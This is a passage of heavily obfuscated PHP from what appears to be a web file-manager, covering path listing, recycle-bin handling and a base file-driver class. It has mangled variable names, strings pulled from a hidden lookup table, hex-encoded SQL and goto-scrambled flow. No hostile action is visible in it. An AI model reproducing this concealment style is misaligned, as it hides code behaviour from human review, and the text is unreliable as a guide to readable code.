$£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[546]] = $£İšŠ…®[$¥İãÄÊ«[547]]; $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[548]] = $¥İãÄÊ«[88]; if ($˜šÛÚš[$¥İãÄÊ«[492]] != $²»î©å) { $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[452]] = $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[452]] & $˜šÛÚš[$¥İãÄÊ«[451]][$¥İãÄÊ«[451]]; } continue; } $¯Ôòâú = $this->parentLevelArray($£İšŠ…®[$¥İãÄÊ«[549]]); $Ú©ø„‘ı = array_reverse($¯Ôòâú); foreach ($Ú©ø„‘ı as $Ü…÷æõ => $Š¬Ú¦®ë) { if (!isset($ ú Ÿ·Ç[$Š¬Ú¦®ë])) { continue; } $˜šÛÚš = $ ú Ÿ·Ç[$Š¬Ú¦®ë]; $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[545]] = $˜šÛÚš; if ($˜šÛÚš[$¥İãÄÊ«[492]] != $²»î©å) { $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[452]] = $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[452]] & $˜šÛÚš[$¥İãÄÊ«[451]][$¥İãÄÊ«[451]]; } $Õüğâú = $¥İãÄÊ«[12]; $àˆ¼ö†È = count($¯Ôòâú) - $Ü…÷æõ; for ($Ğ¦’Û×» = 0; $Ğ¦’Û×» < $àˆ¼ö†È; $Ğ¦’Û×»++) { if (!isset($¬ñ­øÎ¼[$¯Ôòâú[$Ğ¦’Û×»]])) { $Õüğâú = $¥İãÄÊ«[12]; break; } $Õüğâú = $Õüğâú . rtrim($¬ñ­øÎ¼[$¯Ôòâú[$Ğ¦’Û×»]], $¥İãÄÊ«[8]) . $¥İãÄÊ«[8]; } $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[546]] = rtrim($Õüğâú, $¥İãÄÊ«[8]) . $¥İãÄÊ«[8]; break; } } unset($£İšŠ…®); } public function groupPathDisplay(&$ê”Ğ²˜ú) { $Ô‰íĞÈ =& $_SERVER[¡“ËÌ§œ]; if ($ê”Ğ²˜ú[$Ô‰íĞÈ[449]] != self::TYPE_GROUP) { return; } $Õ² © = Model($Ô‰íĞÈ[550])->getInfo($ê”Ğ²˜ú[$Ô‰íĞÈ[534]]); $›î×‰ßÜ = $this->parentLevelArray($Õ² ©[$Ô‰íĞÈ[549]]); $‡—˜üÛ‹ = $Ô‰íĞÈ[12]; foreach ($›î×‰ßÜ as $êóÄ¬³Ò) { $ôëé‡¤İ = Model($Ô‰íĞÈ[550])->getInfo($êóÄ¬³Ò); $‡—˜üÛ‹ .= $ôëé‡¤İ[$Ô‰íĞÈ[87]][$Ô‰íĞÈ[440]] . $Ô‰íĞÈ[50]; } $ê”Ğ²˜ú[$Ô‰íĞÈ[551]] = $Õ² ©[$Ô‰íĞÈ[470]]; $ê”Ğ²˜ú[$Ô‰íĞÈ[552]] = $Õ² ©[$Ô‰íĞÈ[549]]; $ê”Ğ²˜ú[$Ô‰íĞÈ[553]] = $Õ² ©[$Ô‰íĞÈ[554]]; $ê”Ğ²˜ú[$Ô‰íĞÈ[555]] = $‡—˜üÛ‹ . $Õ² ©[$Ô‰íĞÈ[87]][$Ô‰íĞÈ[440]]; } protected function _listAppendPath(&$–ÜÔ²“, $ğ€’ú› = false) { $Œ¹õ’ÇÁ =& $_SERVER[¡“ËÌ§œ]; static $÷•õğÏœ = array(); $ÅíÎ×Ğ = array(); $ÅıòÛ‹Ã = array(); if ($ğ€’ú›) { return $÷•õğÏœ; } foreach ($–ÜÔ²“ as &$ïşÈ¬†¢) { $áÇÀÙÍ = $ïşÈ¬†¢[$Œ¹õ’ÇÁ[440]]; if ($ïşÈ¬†¢[$Œ¹õ’ÇÁ[448]] == $Œ¹õ’ÇÁ[88] && $ïşÈ¬†¢[$Œ¹õ’ÇÁ[470]] != 0) { $÷•õğÏœ[$áÇÀÙÍ] = $ïşÈ¬†¢[$Œ¹õ’ÇÁ[32]]; } if ($ïşÈ¬†¢[$Œ¹õ’ÇÁ[448]] == $Œ¹õ’ÇÁ[88] && $ïşÈ¬†¢[$Œ¹õ’ÇÁ[470]] == 0 && !isset($÷•õğÏœ[$áÇÀÙÍ])) { $÷•õğÏœ[$áÇÀÙÍ] = $this->_listAppendPathRoot($ïşÈ¬†¢, array()); } if (isset($ÅıòÛ‹Ã[$ïşÈ¬†¢[$Œ¹õ’ÇÁ[549]]])) { continue; } $ÅıòÛ‹Ã[$ïşÈ¬†¢[$Œ¹õ’ÇÁ[549]]] = !0; $ÁŒÉñÄ = $this->parentLevelArray($ïşÈ¬†¢[$Œ¹õ’ÇÁ[549]]); foreach ($ÁŒÉñÄ as $æ§Úèƒè => $à‡ù‰Š) { if (isset($÷•õğÏœ[$à‡ù‰Š])) { continue; } if ($æ§Úèƒè == 0) { $÷•õğÏœ[$à‡ù‰Š] = $this->_listAppendPathRoot($ïşÈ¬†¢, $ÁŒÉñÄ); } if ($æ§Úèƒè != 0) { $ÅíÎ×Ğ[] = $à‡ù‰Š; } } } unset($ïşÈ¬†¢); $ÅíÎ×Ğ = array_unique($ÅíÎ×Ğ); if (count($ÅíÎ×Ğ) > 0) { $í§ÄÜÕº = array($Œ¹õ’ÇÁ[455] => array($Œ¹õ’ÇÁ[456], $ÅíÎ×Ğ)); if (count($ÅíÎ×Ğ) == 1) { $–òÜàÏ¯ = $this->sourceInfo($ÅíÎ×Ğ[0]); $È•••À¥ = is_array($–òÜàÏ¯) ? array($–òÜàÏ¯) : !1; } else { $È•••À¥ = $this->field($Œ¹õ’ÇÁ[556])->where($í§ÄÜÕº)->select(); } if (!$È•••À¥) { $È•••À¥ = array(); } foreach ($È•••À¥ as $¶Á¨«¯Á) { $÷•õğÏœ[$¶Á¨«¯Á[$Œ¹õ’ÇÁ[440]]] = $¶Á¨«¯Á[$Œ¹õ’ÇÁ[32]]; } } $áÛá»Àæ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $å…½Ùâ‰ = array(); foreach ($–ÜÔ²“ as &$ïşÈ¬†¢) { $‰ œĞæÅ = $ïşÈ¬†¢[$Œ¹õ’ÇÁ[549]]; $Á…ÕÆ˜Ö = $Œ¹õ’ÇÁ[12]; if (isset($å…½Ùâ‰[$‰ œĞæÅ])) { $Á…ÕÆ˜Ö = $å…½Ùâ‰[$‰ œĞæÅ]; } else { $ÁŒÉñÄ = $this->parentLevelArray($ïşÈ¬†¢[$Œ¹õ’ÇÁ[549]]); foreach ($ÁŒÉñÄ as $æ§Úèƒè => $à‡ù‰Š) { if (isset($÷•õğÏœ[$à‡ù‰Š])) { $Á…ÕÆ˜Ö .= $÷•õğÏœ[$à‡ù‰Š] . $Œ¹õ’ÇÁ[8]; } } $å…½Ùâ‰[$‰ œĞæÅ] = $Á…ÕÆ˜Ö; } $Á…ÕÆ˜Ö .= $ïşÈ¬†¢[$Œ¹õ’ÇÁ[32]]; if ($ïşÈ¬†¢[$Œ¹õ’ÇÁ[448]] == $Œ¹õ’ÇÁ[88]) { $Á…ÕÆ˜Ö .= $Œ¹õ’ÇÁ[8]; } $ïşÈ¬†¢[$Œ¹õ’ÇÁ[547]] = str_replace($Œ¹õ’ÇÁ[557], $Œ¹õ’ÇÁ[8], $Á…ÕÆ˜Ö); if ($ïşÈ¬†¢[$Œ¹õ’ÇÁ[470]] == $Œ¹õ’ÇÁ[198]) { $ïşÈ¬†¢[$Œ¹õ’ÇÁ[32]] = trim($÷•õğÏœ[$ïşÈ¬†¢[$Œ¹õ’ÇÁ[440]]], $Œ¹õ’ÇÁ[8]); $ïşÈ¬†¢[$Œ¹õ’ÇÁ[547]] = $ïşÈ¬†¢[$Œ¹õ’ÇÁ[32]] . $Œ¹õ’ÇÁ[8]; } if (intval($ïşÈ¬†¢[$Œ¹õ’ÇÁ[449]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ïşÈ¬†¢, $ÁŒÉñÄ, $áÛá»Àæ); } } unset($ïşÈ¬†¢); return $–ÜÔ²“; } private function _listAppendPathRecycle(&$‡ã£Á˜±, $ÒñÆÅ‹Ê, $©²¡İæ÷) { $ÜŞûŠâ =& $_SERVER[¡“ËÌ§œ]; if (!in_array($©²¡İæ÷, $ÒñÆÅ‹Ê) && $‡ã£Á˜±[$ÜŞûŠâ[440]] != $©²¡İæ÷) { return; } $Ãµ·Ã¸ë = explode($ÜŞûŠâ[8], trim($‡ã£Á˜±[$ÜŞûŠâ[547]], $ÜŞûŠâ[8])); $®„Ö¯ñ‰ = implode($ÜŞûŠâ[8], array_slice($Ãµ·Ã¸ë, 2)); $‡ã£Á˜±[$ÜŞûŠâ[547]] = $ÜŞûŠâ[8] . LNG($ÜŞûŠâ[558]) . $ÜŞûŠâ[8] . ltrim($®„Ö¯ñ‰, $ÜŞûŠâ[8]); $‡ã£Á˜±[$ÜŞûŠâ[549]] = $ÜŞûŠâ[559] . implode($ÜŞûŠâ[50], array_slice($ÒñÆÅ‹Ê, 1)) . $ÜŞûŠâ[50]; if ($‡ã£Á˜±[$ÜŞûŠâ[440]] == $©²¡İæ÷) { $‡ã£Á˜±[$ÜŞûŠâ[549]] = $ÜŞûŠâ[559]; $‡ã£Á˜±[$ÜŞûŠâ[470]] = $ÜŞûŠâ[198]; $‡ã£Á˜±[$ÜŞûŠâ[32]] = LNG($ÜŞûŠâ[558]); } $‡ã£Á˜±[$ÜŞûŠâ[560]] = $ÜŞûŠâ[561]; } protected function _listAppendPathRoot(&$Ö©­Ÿ÷ò, $“í‡¶•) { $øùöê¶˜ =& $_SERVER[¡“ËÌ§œ]; static $š¨Ô¨ÅÙ = false; $âŸŞ‚²˜ = $øùöê¶˜[12]; if ($Ö©­Ÿ÷ò[$øùöê¶˜[449]] == self::TYPE_USER) { if ($Ö©­Ÿ÷ò[$øùöê¶˜[534]] == USER_ID) { $âŸŞ‚²˜ = LNG($øùöê¶˜[562]); if ($š¨Ô¨ÅÙ === !1) { $¦Ôœ“ÅÁ = Model($øùöê¶˜[563])->getInfoFull(USER_ID); $š¨Ô¨ÅÙ = _get($¦Ôœ“ÅÁ, $øùöê¶˜[564], $øùöê¶˜[12]); } if ($“í‡¶• && $“í‡¶•[0] == $š¨Ô¨ÅÙ || !$“í‡¶• && $Ö©­Ÿ÷ò[$øùöê¶˜[440]] == $š¨Ô¨ÅÙ) { $âŸŞ‚²˜ = LNG($øùöê¶˜[565]); $Ö©­Ÿ÷ò[$øùöê¶˜[566]] = $øùöê¶˜[567]; } if (!$“í‡¶•) { $Ö©­Ÿ÷ò[$øùöê¶˜[32]] = $âŸŞ‚²˜; } } else { $‘ãØÓşê = Model($øùöê¶˜[542])->getInfoSimple($Ö©­Ÿ÷ò[$øùöê¶˜[534]]); $âŸŞ‚²˜ = LNG($øùöê¶˜[568]) . $øùöê¶˜[162] . $‘ãØÓşê[$øùöê¶˜[32]] . $øùöê¶˜[164]; $Ö©­Ÿ÷ò[$øùöê¶˜[569]] = array($øùöê¶˜[32] => $‘ãØÓşê[$øùöê¶˜[32]], $øùöê¶˜[570] => $‘ãØÓşê[$øùöê¶˜[570]], $øùöê¶˜[571] => $‘ãØÓşê[$øùöê¶˜[571]]); } } else { if ($Ö©­Ÿ÷ò[$øùöê¶˜[449]] == self::TYPE_GROUP) { $‘ãØÓşê = Model($øùöê¶˜[550])->getInfoSimple($Ö©­Ÿ÷ò[$øùöê¶˜[534]]); $âŸŞ‚²˜ = $‘ãØÓşê[$øùöê¶˜[32]]; } else { if ($Ö©­Ÿ÷ò[$øùöê¶˜[449]] == self::TYPE_SYSTEM) { $âŸŞ‚²˜ = $øùöê¶˜[572]; } } } $âŸŞ‚²˜ = $âŸŞ‚²˜ ? $øùöê¶˜[8] . $âŸŞ‚²˜ . $øùöê¶˜[8] : $øùöê¶˜[8]; return $âŸŞ‚²˜; } protected function _listAppendUser(&$‡¥û‹ŒØ) { $¾÷ÍêÁü =& $_SERVER[¡“ËÌ§œ]; $¡Ÿß˜ˆ¯ = array_to_keyvalue($‡¥û‹ŒØ, $¾÷ÍêÁü[12], $¾÷ÍêÁü[492]); $ªÛı‘ÂÈ = array_to_keyvalue($‡¥û‹ŒØ, $¾÷ÍêÁü[12], $¾÷ÍêÁü[494]); $Ëç€ûœ‚ = array_merge($¡Ÿß˜ˆ¯, $ªÛı‘ÂÈ); $Ò³‘²¥ = Model($¾÷ÍêÁü[563])->userListInfo($Ëç€ûœ‚); foreach ($‡¥û‹ŒØ as &$ÔÍ‚ë‰¹) { $ùË¦Ë¨¾ = $ÔÍ‚ë‰¹[$¾÷ÍêÁü[492]]; $ÔÍ‚ë‰¹[$¾÷ÍêÁü[492]] = $Ò³‘²¥[$ùË¦Ë¨¾] ? $Ò³‘²¥[$ùË¦Ë¨¾] : !1; $ùË¦Ë¨¾ = $ÔÍ‚ë‰¹[$¾÷ÍêÁü[494]]; $ÔÍ‚ë‰¹[$¾÷ÍêÁü[494]] = $Ò³‘²¥[$ùË¦Ë¨¾] ? $Ò³‘²¥[$ùË¦Ë¨¾] : !1; if (isset($ÔÍ‚ë‰¹[$¾÷ÍêÁü[504]]) && $ÔÍ‚ë‰¹[$¾÷ÍêÁü[504]][$¾÷ÍêÁü[573]]) { $Î´‚ü†ò = $GLOBALS[$¾÷ÍêÁü[6]][$¾÷ÍêÁü[89]][$¾÷ÍêÁü[574]]; if ($ÔÍ‚ë‰¹[$¾÷ÍêÁü[504]][$¾÷ÍêÁü[575]] <= time() - $Î´‚ü†ò) { $this->metaSet($ÔÍ‚ë‰¹[$¾÷ÍêÁü[440]], $¾÷ÍêÁü[573], null); $this->metaSet($ÔÍ‚ë‰¹[$¾÷ÍêÁü[440]], $¾÷ÍêÁü[575], null); unset($ÔÍ‚ë‰¹[$¾÷ÍêÁü[504]][$¾÷ÍêÁü[573]]); continue; } $¯€„Êˆ½ = $ÔÍ‚ë‰¹[$¾÷ÍêÁü[504]][$¾÷ÍêÁü[573]]; $ÔÍ‚ë‰¹[$¾÷ÍêÁü[504]][$¾÷ÍêÁü[576]] = Model($¾÷ÍêÁü[563])->getInfoSimpleOuter($¯€„Êˆ½); } } unset($ÔÍ‚ë‰¹); } public function parentLevelArray($¶ÛşØŒø) { $„¶ÀÆßî =& $_SERVER[¡“ËÌ§œ]; $¶ÛşØŒø = explode($„¶ÀÆßî[50], trim($¶ÛşØŒø, $„¶ÀÆßî[50])); return array_remove_value($¶ÛşØŒø, $„¶ÀÆßî[198]); } public function listAll($·¥—§¢) { $ÁÉœñ½ =& $_SERVER[¡“ËÌ§œ]; $õÒ‹Ç°à = $this->sourceInfo($·¥—§¢); $İ¤îşÌ¯ = array($ÁÉœñ½[577] => array($ÁÉœñ½[578], $õÒ‹Ç°à[$ÁÉœñ½[549]] . $·¥—§¢ . $ÁÉœñ½[579]), $ÁÉœñ½[580] => 0); $ƒú·ƒŒ = $ÁÉœñ½[581]; $¿É«üô± = "\x4c\x45\106\x54\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\137\x66\x69\154\145\x20\146\x69\154\x65\x20\x6f\156\40\x73\157\165\x72\143\145\x2e\x66\151\x6c\x65\111\104\x20\x3d\40\146\151\154\x65\x2e\146\x69\x6c\145\111\x44"; $ïŸş¿ñš = $this->alias($ÁÉœñ½[484])->field($ƒú·ƒŒ)->where($İ¤îşÌ¯)->join($¿É«üô±)->select(); $this->_listAppendAuth($ïŸş¿ñš); $this->_listAppendUser($ïŸş¿ñš); $this->_listAppendPath($ïŸş¿ñš); $ïŸş¿ñš = array_to_keyvalue($ïŸş¿ñš, $ÁÉœñ½[440]); $­á³œûé = "\57{$õÒ‹Ç°à[$ÁÉœñ½[32]]}\x2f"; $­á³œûé = $­á³œûé == $ÁÉœñ½[557] ? $ÁÉœñ½[8] : $­á³œûé; $œì‡£ = array(); foreach ($ïŸş¿ñš as $’¼¥é¾ => $ÍŞ•ëÕ) { $§–×Ø‡ = $this->parentLevelArray($ÍŞ•ëÕ[$ÁÉœñ½[549]]); array_shift($§–×Ø‡); $ÈÌç­—Ç = $­á³œûé; for ($»Ù¸´ğ÷ = 0; $»Ù¸´ğ÷ < count($§–×Ø‡); $»Ù¸´ğ÷++) { $ÈÌç­—Ç .= $ïŸş¿ñš[$§–×Ø‡[$»Ù¸´ğ÷]][$ÁÉœñ½[32]] . $ÁÉœñ½[8]; } $ÈÌç­—Ç .= $ÍŞ•ëÕ[$ÁÉœñ½[32]]; if ($ÍŞ•ëÕ[$ÁÉœñ½[448]]) { $ÈÌç­—Ç .= $ÁÉœñ½[8]; } $ó¶Ùµªâ = array($ÁÉœñ½[459] => str_replace($ÁÉœñ½[557], $ÁÉœñ½[8], str_replace($ÁÉœñ½[557], $ÁÉœñ½[8], str_replace($ÁÉœñ½[557], $ÁÉœñ½[8], $ÈÌç­—Ç))), $ÁÉœñ½[582] => intval($ÍŞ•ëÕ[$ÁÉœñ½[448]]), $ÁÉœñ½[583] => intval($ÍŞ•ëÕ[$ÁÉœñ½[76]]), $ÁÉœñ½[85] => intval($ÍŞ•ëÕ[$ÁÉœñ½[85]]), $ÁÉœñ½[87] => $this->pathInfoFilter($ÍŞ•ëÕ)); if (!$ó¶Ùµªâ[$ÁÉœñ½[448]]) { $ó¶Ùµªâ[$ÁÉœñ½[506]] = $ÍŞ•ëÕ[$ÁÉœñ½[506]]; } $œì‡£[] = $ó¶Ùµªâ; } $œì‡£ = array_sort_by($œì‡£, $ÁÉœñ½[84]); return $œì‡£; } } goto a¿õƒä»; cùÒÊ£·óª: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $·™œîÒ” =& $_SERVER[¡“ËÌ§œ]; $this->objectDriver = array($·™œîÒ”[60], $·™œîÒ”[61], $·™œîÒ”[62], $·™œîÒ”[63], $·™œîÒ”[64], $·™œîÒ”[65], $·™œîÒ”[66], $·™œîÒ”[67], $·™œîÒ”[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¥®§ç‰) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¥®§ç‰, $_SERVER[¡“ËÌ§œ][8]); } return $¥®§ç‰; } public function iconvApp($ºœ´÷å®) { return $ºœ´÷å®; } public function iconvSystem($“ã³£Á) { return $“ã³£Á; } public function iconvTo($¾’ı¥æü, $¸ı½™Ò, $Ï½Îƒü½) { $ú¥ÔĞ® =& $_SERVER[¡“ËÌ§œ]; if (!$¾’ı¥æü || !function_exists($ú¥ÔĞ®[69])) { return $¾’ı¥æü; } static $ÉÃÖ “Æ = array(); $Õ¨åÓ¶ß = $¸ı½™Ò . $ú¥ÔĞ®[70] . $Ï½Îƒü½ . $ú¥ÔĞ®[71] . $¾’ı¥æü; if (isset($ÉÃÖ “Æ[$Õ¨åÓ¶ß])) { return $ÉÃÖ “Æ[$Õ¨åÓ¶ß]; } if (function_exists($ú¥ÔĞ®[72])) { $¡·•ÈÒú = @mb_convert_encoding($¾’ı¥æü, $Ï½Îƒü½, $¸ı½™Ò); } else { $¡·•ÈÒú = @iconv($¸ı½™Ò, $Ï½Îƒü½, $¾’ı¥æü); } $¡·•ÈÒú = $¡·•ÈÒú ? $¡·•ÈÒú : $¾’ı¥æü; if (strstr($¡·•ÈÒú, $ú¥ÔĞ®[73])) { $¡·•ÈÒú = str_replace($ú¥ÔĞ®[73], $ú¥ÔĞ®[11], $¡·•ÈÒú); } $ÉÃÖ “Æ[$¸ı½™Ò . $ú¥ÔĞ®[70] . $Ï½Îƒü½ . $ú¥ÔĞ®[71] . $¾’ı¥æü] = $¡·•ÈÒú; $ÉÃÖ “Æ[$Ï½Îƒü½ . $ú¥ÔĞ®[70] . $¸ı½™Ò . $ú¥ÔĞ®[71] . $¾’ı¥æü] = $¾’ı¥æü; $ÉÃÖ “Æ[$Ï½Îƒü½ . $ú¥ÔĞ®[70] . $¸ı½™Ò . $ú¥ÔĞ®[71] . $¡·•ÈÒú] = $¾’ı¥æü; $ÉÃÖ “Æ[$¸ı½™Ò . $ú¥ÔĞ®[70] . $Ï½Îƒü½ . $ú¥ÔĞ®[71] . $¡·•ÈÒú] = $¡·•ÈÒú; return $¡·•ÈÒú; } public function getPathInner($”‹ÖËİ) { $µÓÈ–Š = IO::init($”‹ÖËİ); return $µÓÈ–Š->path; } public function getPathOuter($ÃíÓ©ç) { $±á›şü =& $_SERVER[¡“ËÌ§œ]; $À¨á±­ê = strlen(trim($this->pathBase, $±á›şü[8])); $ÃíÓ©ç = substr(trim($ÃíÓ©ç, $±á›şü[8]), $À¨á±­ê); return $this->pathDriver . $±á›şü[8] . ltrim($ÃíÓ©ç, $±á›şü[8]); } public function isParentOf($„¼îı„, $òïæíÅæ) { $»÷ÁşÅÑ =& $_SERVER[¡“ËÌ§œ]; $„¼îı„ = rtrim(strtolower($„¼îı„), $»÷ÁşÅÑ[8]) . $»÷ÁşÅÑ[8]; $òïæíÅæ = rtrim(strtolower($òïæíÅæ), $»÷ÁşÅÑ[8]) . $»÷ÁşÅÑ[8]; $û°¨“Ñä = strpos($òïæíÅæ, $„¼îı„) === 0; return $û°¨“Ñä; } public function getType() { $†ß­‘ =& $_SERVER[¡“ËÌ§œ]; $ÑÄÒÌÂ = str_replace($†ß­‘[74], $†ß­‘[12], get_class($this)); return strtolower($ÑÄÒÌÂ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ãŸå›–ß, $Ê¼¼µ™) { $ê‰ÇÙÄ =& $_SERVER[¡“ËÌ§œ]; $ËúÓ¨¬³ = rtrim($ãŸå›–ß, $ê‰ÇÙÄ[8]) . $ê‰ÇÙÄ[8] . $Ê¼¼µ™; $°éóµæø = $this->exist($ËúÓ¨¬³); return $°éóµæø ? $ËúÓ¨¬³ : !1; } public function setModifyTime($¦õ–ÕÕ§, $ÊƒŸ¾ = '') { } public function renameObject($ê¯ÎÒÛ, $™ºŠ¾ò) { $Ï´îèÃÜ = $™ºŠ¾ò; $ê¯ÎÒÛ = $this->getPathOuter($ê¯ÎÒÛ); $™ºŠ¾ò = $this->pathFather($ê¯ÎÒÛ) . $™ºŠ¾ò; $…ÚÆ„ùµ = IO::copy($ê¯ÎÒÛ, $this->pathFather($ê¯ÎÒÛ), REPEAT_RENAME_FOLDER, $Ï´îèÃÜ); if ($…ÚÆ„ùµ) { IO::remove($ê¯ÎÒÛ); } return $…ÚÆ„ùµ ? $™ºŠ¾ò : !1; } public function tempFile($§³Ì¸ëç = '', $ïÌ¿£ = '') { if (!$§³Ì¸ëç) { $§³Ì¸ëç = rand_string(15); } $ş‹Œ…˜Ò = TEMP_FILES . rand_string(15) . $_SERVER[¡“ËÌ§œ][8]; @mkdir($ş‹Œ…˜Ò, DEFAULT_PERRMISSIONS, !0); $ÏŒ¦ë¿  = $ş‹Œ…˜Ò . $§³Ì¸ëç; @touch($ÏŒ¦ë¿ ); if ($ïÌ¿£) { file_put_contents($ÏŒ¦ë¿ , $ïÌ¿£); } return $ÏŒ¦ë¿ ; } public function tempFileRemve($¿¥üä„Å) { @unlink($¿¥üä„Å); @rmdir($this->pathFather($¿¥üä„Å)); } public function mkfile($•¨‚Äâº, $ô“µÎÙ = '', $ëŠª¨Òã = REPEAT_RENAME) { } public function mkdir($«íêÙì¸, $Ş¹òüü = REPEAT_SKIP) { } public function delFile($”¹Ñ…è£) { } public function delFolder($éËãèè¨) { } public function copyFile($‚€ú÷ì±, $êËû¨Ï‹) { } public function moveFile($½ïØü¢, $ıé´áèé) { } public function remove($èÏ¹Ë™á) { if ($this->isFile($èÏ¹Ë™á)) { return $this->delFile($èÏ¹Ë™á); } return $this->delFolder($èÏ¹Ë™á); } public function rename($òÇáÀõä, $µá¦Øù¶) { } public function exist($ÊõïôÅ) { } public function findByHash($ š´š·Ç = '', $Ïíâ¢½’ = '') { return !1; } public function isFile($ÆÉºÇƒö) { } public function isFolder($Œ©œ Ú) { } public function size($ë˜Š°Çù) { } public function info($çÁÁÖà) { } public function infoSimple($üÊ»ª˜) { return $this->info($üÊ»ª˜); } public function infoAuth($çæ«µ­Ï) { return $this->info($çæ«µ­Ï); } public function infoFull($Ë¥ä¾Ó™) { return $this->info($Ë¥ä¾Ó™); } public function infoWithChildren($Çş‚ÈŒÜ) { $Í¦»ÆÏ =& $_SERVER[¡“ËÌ§œ]; static $»²ñÈÎ¾ = array(); if (isset($»²ñÈÎ¾[$Çş‚ÈŒÜ])) { return $»²ñÈÎ¾[$Çş‚ÈŒÜ]; } $ ƒÀúë = $this->info($Çş‚ÈŒÜ); if ($ ƒÀúë && $ ƒÀúë[$Í¦»ÆÏ[33]] == $Í¦»ÆÏ[75]) { $¦ƒ—Îßü = array($Í¦»ÆÏ[76] => 0, $Í¦»ÆÏ[77] => 0, $Í¦»ÆÏ[78] => 0); $this->infoChildren($Çş‚ÈŒÜ, $¦ƒ—Îßü); $ ƒÀúë[$Í¦»ÆÏ[76]] = $¦ƒ—Îßü[$Í¦»ÆÏ[76]]; $ ƒÀúë[$Í¦»ÆÏ[79]] = array($Í¦»ÆÏ[80] => $¦ƒ—Îßü[$Í¦»ÆÏ[77]], $Í¦»ÆÏ[81] => $¦ƒ—Îßü[$Í¦»ÆÏ[78]]); $»²ñÈÎ¾[$Çş‚ÈŒÜ] = $ ƒÀúë; } return $ ƒÀúë; } public function listPath($õÀÛä…ƒ, $µÄË ªÍ = false) { } public function has($–»²—¨, $ˆáÚ§÷ = false, $”Á™ÜšŠ = false) { } public function canRead($ßÛé‰Â) { } public function canWrite($İöª‘©¼) { } public function getContent($¶ù‰­™) { } public function setContent($øÆ¥ØÎ€, $”ûïù = '') { } protected function infoChildren($×ÖÂó×ö, &$Æœ£¢÷é) { $©İÏÜ®Ç =& $_SERVER[¡“ËÌ§œ]; check_abort_echo(); $åÖæùÆ = $this->listPath($×ÖÂó×ö, !0); $åÖæùÆ = array_merge($åÖæùÆ[$©İÏÜ®Ç[82]], $åÖæùÆ[$©İÏÜ®Ç[83]]); foreach ($åÖæùÆ as $„˜×ıüÒ) { if ($„˜×ıüÒ[$©İÏÜ®Ç[33]] == $©İÏÜ®Ç[75]) { $Æœ£¢÷é[$©İÏÜ®Ç[78]]++; $µÁÓíİÀ = $this->getPathInner($„˜×ıüÒ[$©İÏÜ®Ç[84]]); $this->infoChildren($µÁÓíİÀ, $Æœ£¢÷é); } else { $Æœ£¢÷é[$©İÏÜ®Ç[77]]++; $Æœ£¢÷é[$©İÏÜ®Ç[76]] += $„˜×ıüÒ[$©İÏÜ®Ç[76]]; } } } public function fileSubstr($Œˆ£Æİ, $‚À­¹€‹, $ÆåçÊ¥) { } public function listAll($ºğ‚÷Ì£) { } public function listAllMake($Öâñø¬Â, &$òÊ¦¿ÛÃ) { $æ„ÖÍìò =& $_SERVER[¡“ËÌ§œ]; check_abort_echo(); $Û®¹êšá = $this->listPath($Öâñø¬Â, !0); if (!$Û®¹êšá) { return; } $ĞÎè§Í« = array_merge($Û®¹êšá[$æ„ÖÍìò[82]], $Û®¹êšá[$æ„ÖÍìò[83]]); foreach ($ĞÎè§Í« as $±¦Ÿ«ÊÍ) { $áÙ‡Çßµ = $±¦Ÿ«ÊÍ[$æ„ÖÍìò[33]] == $æ„ÖÍìò[75]; $’ÄÚ±çİ = array($æ„ÖÍìò[84] => $±¦Ÿ«ÊÍ[$æ„ÖÍìò[84]], $æ„ÖÍìò[75] => $áÙ‡Çßµ); if (isset($±¦Ÿ«ÊÍ[$æ„ÖÍìò[76]])) { $’ÄÚ±çİ[$æ„ÖÍìò[76]] = $±¦Ÿ«ÊÍ[$æ„ÖÍìò[76]]; } if (isset($±¦Ÿ«ÊÍ[$æ„ÖÍìò[85]])) { $’ÄÚ±çİ[$æ„ÖÍìò[85]] = $±¦Ÿ«ÊÍ[$æ„ÖÍìò[85]]; } if (!$áÙ‡Çßµ) { $òÊ¦¿ÛÃ[] = $’ÄÚ±çİ; continue; } $òÊ¦¿ÛÃ[] = $’ÄÚ±çİ; $ãÜÉ¤æ” = $±¦Ÿ«ÊÍ[$æ„ÖÍìò[84]]; $¡¥íÊ˜º = $this->pathDriver; if (substr($±¦Ÿ«ÊÍ[$æ„ÖÍìò[84]], 0, strlen($¡¥íÊ˜º)) == $¡¥íÊ˜º) { $ãÜÉ¤æ” = substr($ãÜÉ¤æ”, strlen($¡¥íÊ˜º)); } $this->listAllMake($ãÜÉ¤æ”, $òÊ¦¿ÛÃ); } } public function listAllSimple($äĞşë­Æ, $›‚¡û®ñ = false) { $İâà•ıˆ = $this->listAll($äĞşë­Æ); return $this->listAllSimpleMake($İâà•ıˆ, $this->getPathOuter($äĞşë­Æ), $›‚¡û®ñ); } public function listAllSimpleMake($à³»ˆ¦æ, $—­ç³†, $ŠÏòç ¬) { $Ô¼§«­Ò =& $_SERVER[¡“ËÌ§œ]; $ëıÇ™ = array(); $—­ç³† = rtrim(get_path_father($—­ç³†), $Ô¼§«­Ò[8]) . $Ô¼§«­Ò[8]; foreach ($à³»ˆ¦æ as $áÉº‹®†) { $üÖŠ•ö = array($Ô¼§«­Ò[84] => $áÉº‹®†[$Ô¼§«­Ò[84]], $Ô¼§«­Ò[86] => $áÉº‹®†[$Ô¼§«­Ò[84]], $Ô¼§«­Ò[75] => $áÉº‹®†[$Ô¼§«­Ò[75]]); if (isset($áÉº‹®†[$Ô¼§«­Ò[76]]) && !$áÉº‹®†[$Ô¼§«­Ò[75]]) { $üÖŠ•ö[$Ô¼§«­Ò[76]] = 